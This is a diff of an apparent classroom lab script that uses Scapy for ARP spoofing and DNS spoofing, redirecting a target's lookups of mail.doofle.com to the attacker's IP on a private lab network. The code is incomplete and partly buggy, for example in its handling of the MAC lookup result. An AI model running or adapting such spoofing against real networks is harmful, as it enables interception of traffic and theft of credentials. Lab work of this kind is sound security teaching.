@@ -7,16 +7,16 @@ import time
 
 DOOFENSHMIRTZ_IP = "10.0.2.15"  # Enter the computer you attack's IP.
 SECRATERY_IP = "10.0.2.5"  # Enter the attacker's IP.
-NETWORK_DNS_SERVER_IP = "10.0.2.43"  # TODO Enter the network's DNS server's IP.
+NETWORK_DNS_SERVER_IP = "10.0.2.43"  # Enter the network's DNS server's IP.
 SPOOF_SLEEP_TIME = 2
 
-IFACE = "???"  # TODO Enter the network interface you work on.
+IFACE = "enp0s3"  # Enter the network interface you work on.
 
 FAKE_GMAIL_IP = SECRATERY_IP  # The ip on which we run
 DNS_FILTER = f"udp port 53 and ip src {DOOFENSHMIRTZ_IP} and ip dst {NETWORK_DNS_SERVER_IP}"  # Scapy filter
 REAL_DNS_SERVER_IP = "8.8.8.8"  # The server we use to get real DNS responses.
 SPOOF_DICT = {  # This dictionary tells us which host names our DNS server needs to fake, and which ips should it give.
-    b"mail.doofle.com": FAKE_GMAIL_IP
+    b"mail.doofle.com.": FAKE_GMAIL_IP
 }
 
 
@@ -49,13 +49,16 @@ class ArpSpoofer(object):
         If not initialized yet, sends an ARP request to the target and waits for a response.
         @return the mac address of the target.
         """
-        arp_to_send = scapy.ARP(pdst=DOOFENSHMIRTZ_IP)
-        ether = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
-        packet = ether/arp_to_send
-        result = scapy.srp(packet,timeout=3,verbose=0)[0]
-        for sent,received in result:
-            print(str(received.hwsrc))
-            # print("IP = " + str(received) + "  , mac is " + str(sent))
+        if self.target_mac is None:
+            arp_to_send = scapy.ARP(pdst=DOOFENSHMIRTZ_IP)
+            ether = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+            packet = ether/arp_to_send
+            result = scapy.srp(packet,timeout=3,verbose=0)[0]
+            self.target_mac = result.hwsrc
+            for sent,received in result:
+                print(str(received.hwsrc))
+        return self.target_mac
+                # print("IP = " + str(received) + "  , mac is " + str(sent))
 
     def spoof(self) -> None:
         """
@@ -65,6 +68,7 @@ class ArpSpoofer(object):
 
         # Your code here...
 
+        arp_response = scapy.ARP(op=2, pdst = DOOFENSHMIRTZ_IP, hwdst = self.get_target_mac(), psrc = self.spoof_ip)
         self.spoof_count += 1
 
     def run(self) -> None:
